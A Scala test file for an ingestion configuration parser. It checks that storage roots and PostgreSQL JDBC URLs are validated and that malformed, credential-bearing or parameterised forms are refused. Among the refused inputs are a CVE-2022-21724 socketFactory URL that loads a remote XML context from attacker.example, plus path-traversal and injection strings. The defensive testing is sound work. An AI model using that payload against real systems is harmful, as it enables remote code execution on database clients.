package lakehouse.ingestion.core.config

import org.scalatest.EitherValues
import org.scalatest.funsuite.AnyFunSuite
import org.scalatest.matchers.should.Matchers

final class LocationsSpec extends AnyFunSuite with Matchers with EitherValues {

  test("a root is file:///absolute/path or s3a://bucket/prefix, and is written one way") {
    RootUri.parse("file:///home/ingest/lake").value.value shouldBe "file:///home/ingest/lake"
    RootUri.parse("file:///home/ingest/lake/").value.value shouldBe "file:///home/ingest/lake"
    RootUri.parse("s3a://lake/").value.value shouldBe "s3a://lake"
    RootUri.parse("s3a://lake").value.value shouldBe "s3a://lake"
    RootUri
      .parse("s3a://my-bucket.prod/lake/v1")
      .value
      .value shouldBe "s3a://my-bucket.prod/lake/v1"

    RootUri.parse("file:///home/ingest/lake").value.isLocal shouldBe true
    RootUri.parse("s3a://lake/").value.isLocal shouldBe false
    RootUri.parse("file:///lake/").value shouldBe RootUri.parse("file:///lake").value
  }

  test("what is not such a root is refused") {
    val notRoots = Seq(
      "",
      "/home/ingest/lake",
      "home/ingest/lake",
      "file:/home/ingest/lake",
      "file://home/ingest/lake",
      "file://localhost/home/ingest/lake",
      "file:///",
      "file:///home/../etc",
      "file:///home//lake",
      "file:///home/ingest/lake?x=1",
      "file:///home/ingest/my lake",
      "file:///home/ingest/_delta_log",
      "s3://lake/",
      "s3n://lake/",
      "s3a://",
      "s3a:///lake",
      "s3a://UPPER/lake",
      "s3a://key:secret@lake/x",
      "s3a://lake/../other",
      "s3a://lake/%2e%2e/x",
      "hdfs://namenode/lake",
      "abfss://container@account.dfs.core.windows.net/lake",
      "http://example.com/lake",
      "C:\\lake"
    )

    notRoots.foreach(text => withClue(s"[$text]")(RootUri.parse(text).isLeft shouldBe true))

    RootUri.parse("s3://lake/").left.value shouldBe
      "must be written with s3a://: another scheme for the same bucket would be another key " +
      "for the same table"
    RootUri.parse("file:/home/ingest/lake").left.value shouldBe
      "must be written as file:///absolute/path, with three slashes"
    RootUri.parse("/home/ingest/lake").left.value shouldBe
      "must be file:///absolute/path or s3a://bucket/prefix"
    RootUri.parse("file:///home/../etc").left.value shouldBe
      "has the segment '..': a path does not climb out of its root"
  }

  test("a root contains itself and what is under it, by whole segments") {
    def root(text: String): RootUri = RootUri.parse(text).value

    root("file:///data/lake").contains(root("file:///data/lake")) shouldBe true
    root("file:///data/lake").contains(root("file:///data/lake/landing")) shouldBe true
    root("file:///data").contains(root("file:///data/lake")) shouldBe true
    root("file:///data/lake/landing").contains(root("file:///data/lake")) shouldBe false
    // Not by its text: `lake2` is not under `lake`.
    root("file:///data/lake").contains(root("file:///data/lake2")) shouldBe false
    root("s3a://lake/a").contains(root("s3a://lake/a/b")) shouldBe true
    root("s3a://lake").contains(root("s3a://other/a")) shouldBe false
    root("file:///lake").contains(root("s3a://lake")) shouldBe false
  }

  test("a database is jdbc:postgresql://host:port/database, and nothing after it") {
    val url = PostgresUrl.parse("jdbc:postgresql://localhost:5432/ingestion_control").value
    (url.host, url.port, url.database) shouldBe (("localhost", 5432, "ingestion_control"))
    url.value shouldBe "jdbc:postgresql://localhost:5432/ingestion_control"

    PostgresUrl.parse("jdbc:postgresql://db.internal/control").value.value shouldBe
      "jdbc:postgresql://db.internal:5432/control"
    PostgresUrl.parse("jdbc:postgresql://10.0.0.7:6432/sales-prod").value.port shouldBe 6432

    PostgresUrl.parse("jdbc:postgresql://localhost/x").value.isLoopback shouldBe true
    PostgresUrl.parse("jdbc:postgresql://127.0.0.1/x").value.isLoopback shouldBe true
    PostgresUrl.parse("jdbc:postgresql://db.internal/x").value.isLoopback shouldBe false
  }

  test("a URL with parameters, credentials or another form is refused, and is not repeated") {
    val parameters = "has parameters: a URL is jdbc:postgresql://host:port/database and nothing " +
      "more. TLS and timeouts are fields of their own, and a password is a reference"
    Seq(
      "jdbc:postgresql://localhost:5432/control?password=hunter2",
      "jdbc:postgresql://localhost:5432/control?sslmode=disable",
      "jdbc:postgresql://localhost:5432/control?connectTimeout=0",
      // The parameters of CVE-2022-21724: the driver loads the class that is named.
      "jdbc:postgresql://localhost:5432/control?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://attacker.example/x.xml",
      "jdbc:postgresql://localhost:5432/control?sslfactory=evil.Factory"
    ).foreach { text =>
      withClue(text) {
        val reason = PostgresUrl.parse(text).left.value
        reason shouldBe parameters
        reason should not include "hunter2"
      }
    }

    PostgresUrl.parse("jdbc:postgresql://ingest:hunter2@localhost:5432/control").left.value shouldBe
      "has a user or a password in it: the user is a field of its own, and a password is a reference"

    Seq(
      "",
      "localhost:5432/control",
      "postgresql://localhost:5432/control",
      "jdbc:postgresql://localhost:5432",
      "jdbc:postgresql://localhost:5432/",
      "jdbc:postgresql:///control",
      "jdbc:postgresql://localhost:port/control",
      "jdbc:postgresql://localhost:5432/control/extra",
      "jdbc:postgresql://localhost:5432/con trol",
      "jdbc:postgresql://host1:5432,host2:5432/control",
      "jdbc:postgresql://[::1]:5432/control",
      "jdbc:mysql://localhost:3306/control",
      "jdbc:postgresql://localhost:5432/control;DROP",
      "jdbc:postgresql://localhost:5432/control#x"
    ).foreach { text =>
      withClue(s"[$text]") {
        PostgresUrl.parse(text).left.value shouldBe "must be jdbc:postgresql://host:port/database"
      }
    }
    PostgresUrl.parse("jdbc:postgresql://localhost:0/control").left.value shouldBe
      "has a port that is not between 1 and 65535"
    PostgresUrl.parse("jdbc:postgresql://localhost:65536/control").isLeft shouldBe true
  }
}
